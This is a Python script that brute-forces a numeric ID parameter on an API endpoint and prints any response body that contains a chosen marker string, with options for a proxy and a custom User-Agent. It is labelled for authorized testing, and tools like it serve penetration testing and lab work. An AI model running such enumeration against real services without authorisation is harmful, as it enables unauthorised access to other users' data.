#!/usr/bin/env python3
"""Brute-force a numeric ID parameter on an API endpoint and detect a marker in the response body.

Usage:
    python3 brute_api.py --url http://target:3003 --start 0 --end 10000 --marker position

Authorized testing only.
"""
import argparse
import sys

import requests


def brute(url: str, start: int, end: int, marker: str, timeout: float,
          proxy: str | None, user_agent: str | None) -> int:
    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    if user_agent:
        session.headers["User-Agent"] = user_agent

    found = 0
    for val in range(start, end):
        try:
            r = session.get(f"{url}/?id={val}", timeout=timeout)
        except requests.exceptions.RequestException as exc:
            print(f"[!] id={val} request error: {exc}", file=sys.stderr)
            continue
        if marker in r.text:
            print(f"[+] Marker found at id={val}")
            print(r.text)
            found += 1
    return 0 if found else 1


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--url", required=True, help="Base URL, e.g. http://target:3003")
    parser.add_argument("--start", type=int, default=0, help="ID range start (default: 0)")
    parser.add_argument("--end", type=int, default=10000, help="ID range end exclusive (default: 10000)")
    parser.add_argument("--marker", required=True, help="Marker string to detect in response body")
    parser.add_argument("--timeout", type=float, default=10.0, help="Per-request timeout in seconds (default: 10)")
    parser.add_argument("--proxy", default=None, help="HTTP(S) proxy URL, e.g. http://127.0.0.1:8080")
    parser.add_argument("--user-agent", default=None, help="Override default User-Agent header")
    args = parser.parse_args()

    if args.start >= args.end:
        parser.error("--start must be less than --end")

    try:
        return brute(args.url.rstrip("/"), args.start, args.end, args.marker,
                     args.timeout, args.proxy, args.user_agent)
    except KeyboardInterrupt:
        print("\n[!] Interrupted.", file=sys.stderr)
        return 130


if __name__ == "__main__":
    sys.exit(main())
